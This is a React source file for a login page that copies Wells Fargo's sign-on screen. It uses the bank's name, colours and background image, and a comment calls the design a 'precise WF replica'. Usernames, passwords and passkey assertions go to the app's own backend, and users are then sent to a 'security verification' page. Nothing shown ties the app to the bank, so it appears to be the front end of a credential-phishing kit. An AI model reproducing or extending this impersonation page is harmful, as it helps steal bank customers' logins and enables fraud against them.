import { useState } from "react";
import { useForm } from "react-hook-form";
import { useMutation } from "@tanstack/react-query";
import { useToast } from "@/hooks/use-toast";
import { apiRequest } from "@/lib/queryClient";
import { Link, useLocation } from "wouter";
import { OfficialFooter, DesktopDisclosure } from "@/components/official-footer";
import wfBg from "@assets/image_1774124438943.png";

type LoginFormData = { username: string; password: string };

function getGreeting() {
  const h = new Date().getHours();
  if (h < 12) return "Good morning";
  if (h < 17) return "Good afternoon";
  return "Good evening";
}

export default function LoginPage() {
  const [showPassword, setShowPassword] = useState(false);
  const [saveUsername, setSaveUsername] = useState(false);
  const [greeting] = useState(getGreeting());
  const [, setLocation] = useLocation();
  const { toast } = useToast();
  const [biometricLoading, setBiometricLoading] = useState(false);

  const handleBiometricLogin = async () => {
    setBiometricLoading(true);
    try {
      const challengeRes = await fetch("/api/auth/biometric/challenge", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ type: "authenticate" }),
      });
      if (!challengeRes.ok) throw new Error();
      const { challenge, rpId, allowCredentials } = await challengeRes.json();
      const credential = await navigator.credentials.get({
        publicKey: {
          challenge: Uint8Array.from(atob(challenge), c => c.charCodeAt(0)),
          rpId: rpId || window.location.hostname,
          allowCredentials: allowCredentials?.map((id: string) => ({
            id: Uint8Array.from(atob(id), c => c.charCodeAt(0)),
            type: "public-key" as const,
            transports: ["internal", "hybrid"] as AuthenticatorTransport[],
          })) || [],
          userVerification: "required",
          timeout: 120000,
        },
      }) as PublicKeyCredential;
      if (credential) {
        const r = credential.response as AuthenticatorAssertionResponse;
        const flags = new Uint8Array(r.authenticatorData)[32];
        const authRes = await fetch("/api/auth/biometric/authenticate", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            credentialId: btoa(String.fromCharCode(...Array.from(new Uint8Array(credential.rawId)))),
            signature: btoa(String.fromCharCode(...Array.from(new Uint8Array(r.signature)))),
            authenticatorData: btoa(String.fromCharCode(...Array.from(new Uint8Array(r.authenticatorData)))),
            clientDataJSON: btoa(String.fromCharCode(...Array.from(new Uint8Array(credential.response.clientDataJSON)))),
            biometricType: "facial_recognition",
            userVerified: (flags & 0x04) !== 0,
            userPresent: (flags & 0x01) !== 0,
            credentialType: credential.type,
            authenticatorAttachment: (credential as any).authenticatorAttachment || "platform",
          }),
        });
        if (authRes.ok) {
          const d = await authRes.json();
          sessionStorage.setItem("loginUsername", d.user?.id || "biometric_user");
          toast({ title: "Sign On Successful" });
          setLocation("/verify");
        }
      }
    } catch {
      // passkey not available or cancelled
    } finally {
      setBiometricLoading(false);
    }
  };

  const [usernameValue, setUsernameValue] = useState("");
  const form = useForm<LoginFormData>({ defaultValues: { username: "", password: "" } });
  const usernameReg = form.register("username", { required: true });
  const passwordReg = form.register("password", { required: true });

  const loginMutation = useMutation({
    mutationFn: async (data: LoginFormData) => {
      const res = await apiRequest("POST", "/api/auth/login", data);
      const result = await res.json();
      return { ...result, username: data.username };
    },
    onSuccess: (data) => {
      sessionStorage.setItem("loginUsername", data.username);
      toast({ title: "Sign On Successful", description: "Please complete security verification..." });
      setLocation("/verify");
    },
    onError: (error: Error) => {
      toast({ title: "Sign On Failed", description: error.message || "Invalid credentials", variant: "destructive" });
    },
  });

  const onSubmit = (data: LoginFormData) => loginMutation.mutate(data);

  /* ── Desktop card — precise WF replica ── */
  const DesktopLoginCard = () => (
    <div
      style={{
        width: 660,
        backgroundColor: "#fff",
        borderRadius: 16,
        boxShadow: "0 2px 20px rgba(0,0,0,0.14)",
        padding: "40px 48px 40px",
      }}
    >
      <h1
        style={{ fontFamily: "Georgia, 'Times New Roman', serif", fontSize: 32, fontWeight: 400, color: "#111", textAlign: "center", marginBottom: 28, lineHeight: 1.15 }}
        data-testid="text-greeting"
      >{greeting}</h1>

      <form onSubmit={form.handleSubmit(onSubmit)}>
        {/* Username */}
        <div style={{ position: "relative", marginBottom: 12 }}>
          <input
            name={usernameReg.name}
            ref={usernameReg.ref}
            onBlur={usernameReg.onBlur}
            onChange={e => { usernameReg.onChange(e); setUsernameValue(e.target.value); }}
            placeholder="Username"
            autoComplete="username"
            autoCapitalize="off"
            autoCorrect="off"
            spellCheck={false}
            data-testid="input-username"
            style={{ width: "100%", height: 54, border: "1px solid #bbb", borderRadius: 8, padding: "0 44px 0 14px", fontSize: 15, color: "#222", backgroundColor: "#fff", outline: "none", boxSizing: "border-box" }}
            onFocus={e => { e.currentTarget.style.borderColor = "#888"; e.currentTarget.style.boxShadow = "0 0 0 3px rgba(0,0,0,0.07)"; }}
            onBlurCapture={e => { e.currentTarget.style.borderColor = "#bbb"; e.currentTarget.style.boxShadow = "none"; }}
          />
          {usernameValue && (
            <button type="button" onMouseDown={e => e.preventDefault()} onClick={() => { form.setValue("username", "", { shouldValidate: true }); setUsernameValue(""); }} data-testid="button-clear-username"
              style={{ position: "absolute", right: 14, top: "50%", transform: "translateY(-50%)", background: "none", border: "none", cursor: "pointer", padding: 0, display: "flex", alignItems: "center", justifyContent: "center" }}>
              <svg viewBox="0 0 20 20" width="18" height="18" fill="none"><circle cx="10" cy="10" r="9" stroke="#999" strokeWidth="1.5"/><path d="M7 7l6 6M13 7l-6 6" stroke="#999" strokeWidth="1.5" strokeLinecap="round"/></svg>
            </button>
          )}
        </div>

        {/* Password */}
        <div style={{ position: "relative", marginBottom: 16 }}>
          <input
            name={passwordReg.name}
            ref={passwordReg.ref}
            onBlur={passwordReg.onBlur}
            onChange={passwordReg.onChange}
            type={showPassword ? "text" : "password"}
            placeholder="Password"
            autoComplete="current-password"
            data-testid="input-password"
            style={{ width: "100%", height: 54, border: "1px solid #bbb", borderRadius: 8, padding: "0 60px 0 14px", fontSize: 15, color: "#222", backgroundColor: "#fff", outline: "none", boxSizing: "border-box" }}
            onFocus={e => { e.currentTarget.style.borderColor = "#888"; e.currentTarget.style.boxShadow = "0 0 0 3px rgba(0,0,0,0.07)"; }}
            onBlurCapture={e => { e.currentTarget.style.borderColor = "#bbb"; e.currentTarget.style.boxShadow = "none"; }}
          />
          <button type="button" onMouseDown={e => e.preventDefault()} onClick={() => setShowPassword(!showPassword)} data-testid="button-toggle-password"
            style={{ position: "absolute", right: 18, top: "50%", transform: "translateY(-50%)", background: "none", border: "none", cursor: "pointer", fontSize: 14, fontWeight: 600, color: "#3d3dbe", padding: 0, letterSpacing: 0 }}>
            {showPassword ? "Hide" : "Show"}
          </button>
        </div>

        {/* Save username */}
        <div style={{ display: "flex", alignItems: "flex-start", gap: 9, marginBottom: 6 }}>
          <input type="checkbox" id="saveUsernameDesktop" checked={saveUsername} onChange={e => setSaveUsername(e.target.checked)} data-testid="checkbox-save-username"
            style={{ width: 16, height: 16, cursor: "pointer", marginTop: 1, flexShrink: 0, borderRadius: 2 }} />
          <label htmlFor="saveUsernameDesktop" style={{ fontSize: 14, color: "#222", cursor: "pointer", userSelect: "none" }}>Save username</label>
        </div>

        <p style={{ fontSize: 12.5, color: "#666", lineHeight: 1.45, marginBottom: 24, paddingLeft: 25 }}>
          To help keep your account secure, save your username only on devices that aren't used by other people.
        </p>

        <div style={{ display: "flex", justifyContent: "center", marginBottom: 16 }}>
          <button
            type="submit"
            disabled={loginMutation.isPending}
            data-testid="button-sign-on"
            style={{
              height: 46,
              width: 280,
              borderRadius: 99,
              border: "none",
              backgroundColor: loginMutation.isPending ? "#c41230" : "#d0d0d0",
              color: loginMutation.isPending ? "#fff" : "#555",
              fontSize: 15,
              fontWeight: 600,
              cursor: loginMutation.isPending ? "not-allowed" : "pointer",
              letterSpacing: 0.2,
              transition: "background-color 0.15s, color 0.15s",
            }}
            onMouseEnter={e => { if (!loginMutation.isPending) (e.currentTarget.style.backgroundColor = "#b8b8b8"); }}
            onMouseLeave={e => { if (!loginMutation.isPending) (e.currentTarget.style.backgroundColor = "#d0d0d0"); }}
            onMouseDown={e => { if (!loginMutation.isPending) { e.currentTarget.style.backgroundColor = "#c41230"; e.currentTarget.style.color = "#fff"; } }}
            onMouseUp={e => { if (!loginMutation.isPending) { e.currentTarget.style.backgroundColor = "#b8b8b8"; e.currentTarget.style.color = "#555"; } }}
          >
            {loginMutation.isPending ? "Signing on…" : "Sign on"}
          </button>
        </div>
      </form>

      <p style={{ textAlign: "center", fontSize: 14, color: "#888", marginBottom: 16 }}>or</p>

      <div style={{ display: "flex", justifyContent: "center", marginBottom: 14 }}>
        <button type="button" onClick={handleBiometricLogin} disabled={biometricLoading} data-testid="button-passkey"
          style={{ height: 46, width: 280, borderRadius: 99, border: "1.5px solid #333", backgroundColor: "#fff", color: "#111", fontSize: 14, fontWeight: 600, cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center", gap: 8, opacity: biometricLoading ? 0.6 : 1 }}>
          <svg viewBox="0 0 22 22" width="17" height="17" fill="none" aria-hidden="true">
            <circle cx="8.5" cy="6.5" r="3.5" stroke="#222" strokeWidth="1.5"/>
            <path d="M1.5 18.5c0-3.6 3.1-6.5 7-6.5" stroke="#222" strokeWidth="1.5" strokeLinecap="round"/>
            <circle cx="16.5" cy="15" r="3" stroke="#222" strokeWidth="1.5"/>
            <path d="M18.9 17.4l1.6 1.6" stroke="#222" strokeWidth="1.4" strokeLinecap="round"/>
          </svg>
          {biometricLoading ? "Authenticating…" : "Use a passkey"}
        </button>
      </div>

      <p style={{ fontSize: 13, color: "#555", lineHeight: 1.5, marginBottom: 32 }}>
        Don't have one? Create a passkey after signing on and skip the password next time.
      </p>

      <div style={{ textAlign: "center" }}>
        <Link href="/forgot-password" data-testid="link-forgot"
          style={{ fontSize: 14, color: "#3d3dbe", textDecoration: "none", display: "inline-flex", alignItems: "center", gap: 5 }}>
          <span style={{ fontSize: 14 }}>→</span>
          Forgot username or password?
        </Link>
      </div>
    </div>
  );

  /* ── Mobile card — original rounded style ── */
  const MobileLoginCard = () => (
    <div>
      <h2
        className="font-normal text-[#111] text-center leading-none mb-7"
        style={{ fontFamily: "Georgia, 'Times New Roman', serif", fontSize: 32 }}
        data-testid="text-greeting-mobile"
      >{greeting}</h2>

      <form onSubmit={form.handleSubmit(onSubmit)}>
        <div className="mb-[10px] relative">
          <input
            name={usernameReg.name}
            ref={usernameReg.ref}
            onBlur={usernameReg.onBlur}
            onChange={e => { usernameReg.onChange(e); setUsernameValue(e.target.value); }}
            placeholder="Username"
            autoComplete="username"
            autoCapitalize="off"
            autoCorrect="off"
            spellCheck={false}
            className="w-full text-[16px] text-gray-800 placeholder-gray-400 bg-white rounded-[12px] focus:outline-none"
            style={{ height: 56, padding: "0 44px 0 14px", border: "1.5px solid #c8c8c8" }}
            data-testid="input-username-mobile"
          />
          {usernameValue && (
            <button type="button" onMouseDown={e => e.preventDefault()} onClick={() => { form.setValue("username", ""); setUsernameValue(""); }}
              className="absolute right-[12px] top-1/2 -translate-y-1/2" data-testid="button-clear-username-mobile">
              <svg viewBox="0 0 20 20" width="20" height="20" fill="none">
                <circle cx="10" cy="10" r="9" stroke="#aaa" strokeWidth="1.5"/>
                <path d="M7 7l6 6M13 7l-6 6" stroke="#aaa" strokeWidth="1.5" strokeLinecap="round"/>
              </svg>
            </button>
          )}
        </div>

        <div className="mb-[14px] relative">
          <input
            name={passwordReg.name}
            ref={passwordReg.ref}
            onBlur={passwordReg.onBlur}
            onChange={passwordReg.onChange}
            type={showPassword ? "text" : "password"}
            placeholder="Password"
            autoComplete="current-password"
            className="w-full text-[16px] text-gray-800 placeholder-gray-400 bg-white rounded-[12px] focus:outline-none"
            style={{ height: 56, padding: "0 56px 0 14px", border: "1.5px solid #c8c8c8" }}
            data-testid="input-password-mobile"
          />
          <button type="button" onMouseDown={e => e.preventDefault()} onClick={() => setShowPassword(!showPassword)}
            className="absolute right-[14px] top-1/2 -translate-y-1/2 text-[#4338ca] text-[15px] font-medium" data-testid="button-toggle-password-mobile">
            {showPassword ? "Hide" : "Show"}
          </button>
        </div>

        <div className="flex items-center gap-[10px] mb-[8px]">
          <div className="w-[18px] h-[18px] flex-shrink-0 border border-gray-500 flex items-center justify-center cursor-pointer bg-white"
            style={{ borderRadius: 3 }} onClick={() => setSaveUsername(!saveUsername)} data-testid="checkbox-save-username-mobile">
            {saveUsername && (
              <svg viewBox="0 0 12 12" className="w-3 h-3" fill="none">
                <path d="M2 6l3 3 5-5" stroke="#333" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"/>
              </svg>
            )}
          </div>
          <label className="text-[15px] text-gray-800 cursor-pointer select-none" onClick={() => setSaveUsername(!saveUsername)}>Save username</label>
        </div>

        <p className="text-[12.5px] text-gray-500 leading-[1.45] mb-[28px]">
          To help keep your account secure, save your username only on devices that aren't used by other people.
        </p>

        <div className="flex justify-center mb-[14px]">
          <button type="submit" disabled={loginMutation.isPending} data-testid="button-sign-on-mobile"
            className="rounded-full text-[16px] font-medium transition-colors disabled:opacity-60"
            style={{ height: 50, width: 220, backgroundColor: "#d0d0d0", color: "#888" }}>
            {loginMutation.isPending ? "Signing on…" : "Sign on"}
          </button>
        </div>
      </form>

      <p className="text-center text-[14px] text-gray-600 mb-[14px]">or</p>

      <div className="flex justify-center mb-[14px]">
        <button type="button" onClick={handleBiometricLogin} disabled={biometricLoading} data-testid="button-passkey-mobile"
          className="rounded-full bg-white text-[15px] font-medium text-gray-900 flex items-center justify-center gap-[7px] hover:bg-gray-50 transition-colors disabled:opacity-60"
          style={{ height: 50, width: 220, border: "1.5px solid #222" }}>
          <svg viewBox="0 0 20 20" width="19" height="19" fill="none" aria-hidden="true">
            <circle cx="8" cy="6" r="3.5" stroke="#333" strokeWidth="1.4"/>
            <path d="M1.5 17c0-3.3 2.9-6 6.5-6" stroke="#333" strokeWidth="1.4" strokeLinecap="round"/>
            <circle cx="15" cy="13.5" r="2.5" stroke="#333" strokeWidth="1.4"/>
            <path d="M17 15l1.5 1.5M18.5 15.5L17 17" stroke="#333" strokeWidth="1.3" strokeLinecap="round"/>
          </svg>
          {biometricLoading ? "Authenticating…" : "Use a passkey"}
        </button>
      </div>

      <p className="text-[12.5px] text-gray-600 leading-[1.45] mb-[36px]">
        Don't have one? Create a passkey after signing on and skip the password next time.
      </p>

      <div className="flex items-center justify-center gap-[5px]">
        <span className="text-[#4b3f9e] text-[15px]">→</span>
        <Link href="/forgot-password" className="text-[#4b3f9e] text-[15px] hover:underline" data-testid="link-forgot-mobile">
          Forgot username or password?
        </Link>
      </div>
    </div>
  );

  return (
    <>
      {/* ── DESKTOP ── */}
      <div className="hidden lg:flex flex-col min-h-screen" style={{ position: "relative" }}>
        {/* Background image layer — filter here only, won't bleed onto content */}
        <div style={{
          position: "fixed",
          inset: 0,
          backgroundImage: `url(${wfBg})`,
          backgroundSize: "cover",
          backgroundPosition: "center center",
          filter: "brightness(1) saturate(1) contrast(1)",
          zIndex: 0,
        }} />
        {/* Content sits above the background */}
        <div style={{ position: "relative", zIndex: 1, display: "flex", flexDirection: "column", minHeight: "100vh" }}>
        {/* Header */}
        <header style={{ backgroundColor: "#c41230", flexShrink: 0 }}>
          <div style={{ height: 56, display: "flex", alignItems: "center", justifyContent: "space-between", padding: "0 32px" }}>
            {/* Logo */}
            <span style={{ fontFamily: "'Times New Roman', Georgia, serif", fontWeight: 700, fontSize: 26, color: "#fff", letterSpacing: "0.10em" }}>
              WELLS FARGO
            </span>
            {/* Nav */}
            <div style={{ display: "flex", alignItems: "center", gap: 24, color: "#fff", fontSize: 14 }}>
              {/* Enroll with lock icon */}
              <Link href="/register" style={{ color: "#fff", textDecoration: "none", display: "flex", alignItems: "center", gap: 6 }} data-testid="link-enroll">
                <svg viewBox="0 0 20 20" width="18" height="18" fill="none">
                  <circle cx="10" cy="10" r="9" stroke="white" strokeWidth="1.4"/>
                  <rect x="6.5" y="9" width="7" height="6" rx="1" stroke="white" strokeWidth="1.3" fill="none"/>
                  <path d="M7.5 9V7.5a2.5 2.5 0 015 0V9" stroke="white" strokeWidth="1.3" strokeLinecap="round" fill="none"/>
                </svg>
                Enroll
              </Link>
              <span style={{ cursor: "pointer" }}>Customer Service</span>
              <span style={{ cursor: "pointer" }}>ATMs/Locations</span>
              <span style={{ cursor: "pointer" }}>Español</span>
              {/* Search box */}
              <div style={{ display: "flex", alignItems: "center", backgroundColor: "#fff", borderRadius: 5, height: 32, overflow: "hidden", cursor: "pointer" }}>
                <span style={{ padding: "0 10px", fontSize: 13.5, color: "#999", whiteSpace: "nowrap" }}>Search</span>
                <div style={{ width: 34, height: 32, backgroundColor: "#fff", display: "flex", alignItems: "center", justifyContent: "center", borderLeft: "1px solid #e0e0e0" }}>
                  <svg viewBox="0 0 18 18" width="16" height="16" fill="none">
                    <circle cx="7.5" cy="7.5" r="5" stroke="#111" strokeWidth="1.8"/>
                    <path d="M11.5 11.5l4 4" stroke="#111" strokeWidth="1.8" strokeLinecap="round"/>
                  </svg>
                </div>
              </div>
            </div>
          </div>
          {/* Gold stripe */}
          <div style={{ height: 4, backgroundColor: "#ffcd41" }} />
        </header>

        {/* Card area */}
        <div style={{ display: "flex", justifyContent: "center", padding: "56px 0 32px" }}>
          {DesktopLoginCard()}
        </div>

        {/* Disclosure */}
        <div style={{ display: "flex", justifyContent: "center", paddingTop: 32 }}>
          <DesktopDisclosure />
        </div>

        {/* Footer */}
        <OfficialFooter />
        </div>
      </div>

      {/* ── MOBILE ── */}
      <div className="lg:hidden min-h-screen flex flex-col bg-white">
        <header className="bg-[#c41230] flex items-center px-4" style={{ height: 52 }}>
          <div className="flex-1" />
          <span
            className="text-white font-bold text-[17px] tracking-[0.16em]"
            style={{ fontFamily: "'Times New Roman', Georgia, serif" }}
          >
            WELLS FARGO
          </span>
          <div className="flex-1 flex justify-end">
            <button type="button" aria-label="Menu" data-testid="button-mobile-menu" className="flex flex-col justify-center gap-[5px] py-2">
              <span className="block w-[22px] h-[2px] bg-white" />
              <span className="block w-[22px] h-[2px] bg-white" />
              <span className="block w-[22px] h-[2px] bg-white" />
            </button>
          </div>
        </header>
        <div className="h-[3px] bg-[#ffcd41]" />
        <main className="flex-1 bg-white overflow-y-auto">
          <div className="px-[18px] pt-7 pb-10">
            {MobileLoginCard()}
          </div>
        </main>
        <OfficialFooter />
      </div>
    </>
  );
}
